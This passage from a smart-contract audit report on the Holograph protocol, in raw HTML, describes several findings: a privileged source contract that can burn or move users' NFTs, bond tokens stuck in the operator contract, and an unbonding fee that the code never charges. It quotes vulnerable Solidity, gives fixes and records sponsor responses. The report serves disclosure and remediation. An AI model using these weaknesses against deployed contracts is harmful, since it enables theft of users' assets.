class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlySource</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_tokenOwner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sourceTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlySource</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_tokenOwner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">_transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>While this might be desirable for extensibility and flexibility, this puts users at the risk of being robbed by the source contract owner or a hacker who hacked the source contract owner’s key.</p>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider removing the <code>sourceBurn</code> and <code>sourceTransfer</code> functions of <code>HolographERC721</code> and requiring user approval to transfer or burn their tokens (<code>burn</code> and <code>safeTransferFrom</code> can be called by a source contract instead of <code>sourceBurn</code> and <code>sourceTransfer</code>).</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/290#issuecomment-1297281122\">gzeon (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Also <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/403\"><code>#403</code></a> brought up that source contract can also steal NFTs from burn address.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/290#issuecomment-1306692944\">alexanderattar (Holograph) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Need to add a <code>require(!_burnedTokens[tokenId], \"ERC721: token has been burned\");</code> check to sourceTransfer function</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/290#event-7817138955\">alexanderattar (Holograph) resolved</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/84\">Feature/HOLO-604: implementing critical issue fixes</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-12-bond-tokens-hlg-can-get-permanently-stuck-in-operator\" style=\"position:relative;\"><a href=\"#m-12-bond-tokens-hlg-can-get-permanently-stuck-in-operator\" aria-label=\"m 12 bond tokens hlg can get permanently stuck in operator permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/322\">[M-12] Bond tokens (HLG) can get permanently stuck in operator</a></h2>\n<p><em>Submitted by minhtrng, also found by arcoun, cccz, Chom, csanuragjain, ctf_sec, Jeiwan, and Lambda</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382\">HolographOperator.sol#L374-L382</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L849-L857\">HolographOperator.sol#L849-L857</a><br></p>\n<p>Bond tokens (HLG) equal to the slash amount will get permanently stuck in the HolographOperator each time a job gets executed by someone who is not an (fallback-)operator.</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>HolographOperator.executeJob</code> function can be executed by anyone after a certain passage of time:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">job</span><span class=\"mtk1\">.</span><span class=\"mtk12\">operator</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">job</span><span class=\"mtk1\">.</span><span class=\"mtk12\">operator</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//perform time and gas price check</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">timeDifference</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">6</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// check msg.sender == correct fallback operator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// slash primary operator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getBaseBondAmount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pod</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_bondedAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">job</span><span class=\"mtk1\">.</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">] -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_bondedAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//determine if primary operator retains his job</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_bondedAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">job</span><span class=\"mtk1\">.</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">] &gt;= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// execute the job</span></span></span></code></pre>\n<p>In case <code>if (timeDifference &#x3C; 6) {</code> gets skipped, the slashed amount will be assigned to the <code>msg.sender</code> regardless if that sender is currently an operator or not. The problem lies within the fact that if <code>msg.sender</code> is not already an operator at the time of executing the job, he cannot become one after, to retrieve the reward he got for slashing the primary operator. This is because the function <code>HolographOperator.bondUtilityToken</code> requires <code>_bondedAmounts</code> to be 0 prior to bonding and hence becoming an operator:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_bondedOperators</span><span class=\"mtk1\">[</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_bondedAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;HOLOGRAPH: operator is bonded&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Assuming that it is intentional that non-operators can execute jobs (which could make sense, so that a user could finish a bridging process on his own, if none of the operators are doing it): remove the requirement that <code>_bondedAmounts</code> need to be 0 prior to bonding and becoming an operator so that non-operators can get access to the slashing reward by unbonding after.</p>\n<p>Alternatively (possibly preferrable), just add a method to withdraw any <code>_bondedAmounts</code> of non-operators.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/322#issuecomment-1306682172\">alexanderattar (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>Known issue that already has been fixed for the next update.</p>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/88\">Feature/HOLO-605: C4 medium risk fixes</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-13-implementation-code-does-not-align-with-the-business-requirement-users-are-not-charged-with-withdrawn-fee-when-user-unbound-token-in-holographoperatorsol\" style=\"position:relative;\"><a href=\"#m-13-implementation-code-does-not-align-with-the-business-requirement-users-are-not-charged-with-withdrawn-fee-when-user-unbound-token-in-holographoperatorsol\" aria-label=\"m 13 implementation code does not align with the business requirement users are not charged with withdrawn fee when user unbound token in holographoperatorsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/142\">[M-13] Implementation code does not align with the business requirement: Users are not charged with withdrawn fee when user unbound token in <code>HolographOperator.sol</code></a></h2>\n<p><em>Submitted by ladboy233</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899\">HolographOperator.sol#L899</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L920\">HolographOperator.sol#L920</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L924\">HolographOperator.sol#L924</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L928\">HolographOperator.sol#L928</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L932\">HolographOperator.sol#L932</a><br></p>\n<p>When user call unbondUtilityToken to unstake the token, the function reads the available bonded amount, and transfers back to the operator.</p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899\">https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> get current bonded amount by operator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_bondedAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> unset operator bond amount before making a transfer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">_bondedAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> remove all operator references</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_popOperator</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_bondedOperators</span><span class=\"mtk1\">[</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">] - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_operatorPodIndex</span><span class=\"mtk1\">[</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> transfer tokens to recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_utilityToken</span><span class=\"mtk1\">().</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;HOLOGRAPH: token transfer failed&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>the logic is clean, but does not conform to the buisness requirement in the documentation, the doc said</p>\n<p><a href=\"https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection\">https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection</a></p>\n<blockquote>\n<p>To move to a different pod, an Operator must withdraw and re-bond HLG. Operators who withdraw HLG will be charged a 0.1% fee, the proceeds of which will be burned or returned to the Treasury.</p>\n</blockquote>\n<p>The charge 0.1% fee is not implemented in the code.</p>\n<p>there are two incentive for bounded operator to stay,</p>\n<p>the first is the reward incentive, the second is to avoid penalty with unbonding.</p>\n<p>Without chargin the unstaking fee, the second incentive is weak and the operator can unbound or bond whenver they want</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection\">https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection</a></p>\n<h3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend charge the 0.1% unstaking fee to make the code align with the busienss requirement in the doc.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> get current bonded amount by operator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_bondedAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">chargedFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">amount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">;  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> unset operator bond amount before making a transfer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">_bondedAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> remove all operator references</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_popOperator</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_bondedOperators</span><span class=\"mtk1\">[</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">] - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_operatorPodIndex</span><span class=\"mtk1\">[</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> transfer tokens to recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_utilityToken</span><span class=\"mtk1\">().</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;HOLOGRAPH: token transfer failed&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/142#issuecomment-1307863427\">alexanderattar (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>This is true. The functionality is purposefully disabled for easier bonding/unbonding testing by team at the moment, but will be addressed in the upcoming release.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/142#issuecomment-1351786887\">alexanderattar (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>On initial mainnet beta launch, Holograph will be operating as the sole operator on the network so this is not an immediate concern, but before the launch of the public operator network, the fee will be added via upgrade.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-14-pa1dbidsharesfortoken-returns-incorrect-bidsharescreatorvalue\" style=\"position:relative;\"><a href=\"#m-14-pa1dbidsharesfortoken-returns-incorrect-bidsharescreatorvalue\" aria-label=\"m 14 pa1dbidsharesfortoken returns incorrect bidsharescreatorvalue permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/180\">[M-14] PA1D#bidSharesForToken returns incorrect <code>bidShares.creator.value</code></a></h2>\n<p><em>Submitted by 0x52</em></p>\n<p><a 